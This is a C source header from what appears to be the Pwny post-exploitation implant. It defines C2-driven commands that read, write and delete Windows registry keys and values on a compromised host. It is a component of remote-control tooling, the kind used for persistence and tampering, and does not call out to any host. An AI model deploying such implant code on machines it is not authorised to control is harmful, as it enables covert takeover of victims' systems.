/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifndef _REGISTRY_H_
#define _REGISTRY_H_

#include <windows.h>

#include <pwny/tlv.h>
#include <pwny/api.h>
#include <pwny/c2.h>
#include <pwny/tlv_types.h>
#include <pwny/log.h>
#include <pwny/misc.h>

#define REGISTRY_BASE 7

#define REGISTRY_READ \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       REGISTRY_BASE, \
                       API_CALL)

#define REGISTRY_WRITE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       REGISTRY_BASE, \
                       API_CALL + 1)

#define REGISTRY_DELETE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       REGISTRY_BASE, \
                       API_CALL + 2)

#define TLV_TYPE_REG_HIVE \
        TLV_TYPE_CUSTOM(TLV_TYPE_INT, REGISTRY_BASE, API_TYPE)

#define TLV_TYPE_REG_PATH \
        TLV_TYPE_CUSTOM(TLV_TYPE_STRING, REGISTRY_BASE, API_TYPE)

#define TLV_TYPE_REG_KEY \
        TLV_TYPE_CUSTOM(TLV_TYPE_STRING, REGISTRY_BASE, API_TYPE + 1)

#define TLV_TYPE_REG_TYPE \
        TLV_TYPE_CUSTOM(TLV_TYPE_INT, REGISTRY_BASE, API_TYPE + 1)

#define TLV_TYPE_REG_VALUE \
        TLV_TYPE_CUSTOM(TLV_TYPE_BYTES, REGISTRY_BASE, API_TYPE)

#define REG_HIVE_HKCR 0
#define REG_HIVE_HKCU 1
#define REG_HIVE_HKLM 2
#define REG_HIVE_HKU  3
#define REG_HIVE_HKCC 4

static HKEY registry_hive_to_hkey(int hive)
{
    switch (hive)
    {
        case REG_HIVE_HKCR: return HKEY_CLASSES_ROOT;
        case REG_HIVE_HKCU: return HKEY_CURRENT_USER;
        case REG_HIVE_HKLM: return HKEY_LOCAL_MACHINE;
        case REG_HIVE_HKU:  return HKEY_USERS;
        case REG_HIVE_HKCC: return HKEY_CURRENT_CONFIG;
        default:             return NULL;
    }
}

static tlv_pkt_t *registry_read(c2_t *c2)
{
    /* Read a registry value.
     *
     * :in u32(TLV_TYPE_REG_HIVE): registry hive (0=HKCR, 1=HKCU, 2=HKLM, 3=HKU, 4=HKCC)
     * :in string(TLV_TYPE_REG_PATH): registry key path
     * :in string(TLV_TYPE_REG_KEY): value name
     * :out u32(TLV_TYPE_REG_TYPE): value type (REG_SZ, REG_DWORD, etc.)
     * :out bytes(TLV_TYPE_REG_VALUE): value data
     * :out u32(TLV_TYPE_STATUS): API_CALL_SUCCESS / API_CALL_FAIL
     */

    int hive;
    char path[512];
    char key[256];

    HKEY hRootKey;
    HKEY hKey;
    DWORD dwType;
    DWORD dwSize;
    BYTE *data;
    LONG status;
    tlv_pkt_t *result;

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_REG_HIVE, &hive) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_REG_PATH, path) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_REG_KEY, key) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    hRootKey = registry_hive_to_hkey(hive);
    if (hRootKey == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    status = RegOpenKeyExA(hRootKey, path, 0, KEY_READ, &hKey);
    if (status != ERROR_SUCCESS)
    {
        log_debug("* Failed to open registry key (%s) error=%ld\n", path, status);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    dwSize = 0;
    dwType = 0;
    RegQueryValueExA(hKey, key, NULL, &dwType, NULL, &dwSize);

    if (dwSize == 0)
    {
        RegCloseKey(hKey);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    data = (BYTE *)calloc(1, dwSize + 1);
    if (data == NULL)
    {
        RegCloseKey(hKey);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    status = RegQueryValueExA(hKey, key, NULL, &dwType, data, &dwSize);
    RegCloseKey(hKey);

    if (status != ERROR_SUCCESS)
    {
        free(data);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    tlv_pkt_add_u32(result, TLV_TYPE_REG_TYPE, dwType);
    tlv_pkt_add_bytes(result, TLV_TYPE_REG_VALUE, data, dwSize);

    free(data);
    return result;
}

static tlv_pkt_t *registry_write(c2_t *c2)
{
    /* Write a registry value.
     *
     * :in u32(TLV_TYPE_REG_HIVE): registry hive
     * :in string(TLV_TYPE_REG_PATH): registry key path
     * :in string(TLV_TYPE_REG_KEY): value name
     * :in u32(TLV_TYPE_REG_TYPE): value type (REG_SZ=1, REG_DWORD=4, etc.)
     * :in bytes(TLV_TYPE_REG_VALUE): value data
     * :out u32(TLV_TYPE_STATUS): API_CALL_SUCCESS / API_CALL_FAIL
     */

    int hive;
    int reg_type;
    char path[512];
    char key[256];

    HKEY hRootKey;
    HKEY hKey;
    LONG status;

    unsigned char *value;
    int value_size;

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_REG_HIVE, &hive) < 0 ||
        tlv_pkt_get_string(c2->request, TLV_TYPE_REG_PATH, path) < 0 ||
        tlv_pkt_get_string(c2->request, TLV_TYPE_REG_KEY, key) < 0 ||
        tlv_pkt_get_u32(c2->request, TLV_TYPE_REG_TYPE, &reg_type) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    value_size = tlv_pkt_get_bytes(c2->request, TLV_TYPE_REG_VALUE, &value);
    if (value_size < 0)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    hRootKey = registry_hive_to_hkey(hive);
    if (hRootKey == NULL)
    {
        free(value);
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    status = RegCreateKeyExA(hRootKey, path, 0, NULL,
                             REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL,
                             &hKey, NULL);
    if (status != ERROR_SUCCESS)
    {
        log_debug("* Failed to create/open registry key (%s) error=%ld\n", path, status);
        free(value);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    status = RegSetValueExA(hKey, key, 0, (DWORD)reg_type, value, value_size);
    RegCloseKey(hKey);
    free(value);

    if (status != ERROR_SUCCESS)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

static tlv_pkt_t *registry_delete(c2_t *c2)
{
    /* Delete a registry value or key.
     *
     * :in u32(TLV_TYPE_REG_HIVE): registry hive
     * :in string(TLV_TYPE_REG_PATH): registry key path
     * :in string(TLV_TYPE_REG_KEY): value name (if empty, deletes the key itself)
     * :out u32(TLV_TYPE_STATUS): API_CALL_SUCCESS / API_CALL_FAIL
     */

    int hive;
    char path[512];
    char key[256];

    HKEY hRootKey;
    HKEY hKey;
    LONG status;
    int key_len;

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_REG_HIVE, &hive) < 0 ||
        tlv_pkt_get_string(c2->request, TLV_TYPE_REG_PATH, path) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    hRootKey = registry_hive_to_hkey(hive);
    if (hRootKey == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    key_len = tlv_pkt_get_string(c2->request, TLV_TYPE_REG_KEY, key);

    if (key_len <= 0 || strlen(key) == 0)
    {
        status = RegDeleteKeyA(hRootKey, path);
    }
    else
    {
        status = RegOpenKeyExA(hRootKey, path, 0, KEY_SET_VALUE, &hKey);
        if (status != ERROR_SUCCESS)
        {
            return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
        }

        status = RegDeleteValueA(hKey, key);
        RegCloseKey(hKey);
    }

    if (status != ERROR_SUCCESS)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

void register_registry_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, REGISTRY_READ, registry_read);
    api_call_register(api_calls, REGISTRY_WRITE, registry_write);
    api_call_register(api_calls, REGISTRY_DELETE, registry_delete);
}

#endif
